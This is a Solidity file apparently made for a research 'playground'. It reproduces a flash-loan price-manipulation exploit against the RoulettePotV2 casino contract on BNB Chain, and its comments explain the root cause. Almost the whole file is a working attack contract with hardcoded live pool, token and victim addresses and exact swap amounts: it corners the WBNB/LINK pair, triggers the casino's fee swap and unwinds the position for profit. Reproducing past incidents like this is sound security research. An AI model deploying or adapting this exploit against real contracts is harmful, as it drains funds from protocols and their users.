// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-01-RoulettePotV2).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the PancakeV3 flash callback `pancakeV3FlashCallback`
// lives on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/RoulettePotV2_exp.sol (RoulettePotV2.testExploit /
// pancakeV3FlashCallback), with the only change being that the recorded
// entrypoint is `run()` instead of `testExploit()`.
//
// Root cause: RoulettePotV2.swapProfitFees() is a permissionless maintenance
// function that sizes its LINK purchase from a single-pool PancakeSwap spot
// quote (getAmountsIn on the WBNB/LINK pair) and then executes the swaps with
// amountOutMin = 0. Both the quote and the execution read the same instantaneous
// reserves the attacker just cornered. By flash-borrowing WBNB and swapping it
// all into LINK, the attacker makes LINK artificially scarce/expensive; the
// casino then overpays ~43 WBNB for ~21 LINK, donating that WBNB straight into
// the pool the attacker has cornered, which the attacker unwinds for profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRoulettePotV2 {
    function finishRound() external;
    function swapProfitFees() external;
}

contract RoulettePotV2Drain {
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849; // WBNB/USDT V3 (flash source)
    address internal constant PancakeSwap = 0x824eb9faDFb377394430d2744fa7C42916DE3eCe; // WBNB/LINK V2 pair (token0=WBNB, token1=LINK)
    address internal constant RoulettePotV2Addr = 0xf573748637E0576387289f1914627d716927F90f; // vulnerable casino
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;

    // Recorded attack: flash-borrow token1 (LINK) worth 4,203.73 units from the
    // PancakeV3 pool, delivered to the WBNB/LINK V2 pair for the swap dance below.
    function run() external {
        address recipient = PancakeSwap;
        uint256 amount0 = 0;
        uint256 amount1 = 4_203_732_130_200_000_000_000;
        bytes memory data = abi.encode(amount1);
        IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);
    }

    // PancakeV3 flash callback — runs the full price-manipulation + drain.
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        uint256 amount = abi.decode(data, (uint256));

        // 1. Corner the WBNB/LINK pair: pull out LINK (token1), making it scarce.
        uint256 amount0Out = 0;
        uint256 amount1Out = 17_527_795_283_271_427_200_665;
        address to = address(this);
        IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));

        // 2. Settle the round, then trigger the permissionless fee-swap. The
        //    casino now reads the manipulated spot price and overpays WBNB for LINK.
        IRoulettePotV2(RoulettePotV2Addr).finishRound();
        IRoulettePotV2(RoulettePotV2Addr).swapProfitFees();

        // 3. Return the LINK to the pair so we can pull WBNB back out.
        uint256 balance = IERC20(LINK).balanceOf(address(this));
        IERC20(LINK).transfer(PancakeSwap, balance);

        // 4. Unwind: pull out WBNB (token0) — our capital plus the donated WBNB.
        amount0Out = 4_243_674_096_928_729_821_513;
        amount1Out = 0;
        IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));

        // 5. Repay the flash loan (principal + fee), keep the rest as WBNB profit.
        IERC20(WBNB).transfer(PancakeV3Pool, amount + fee1);
    }
}
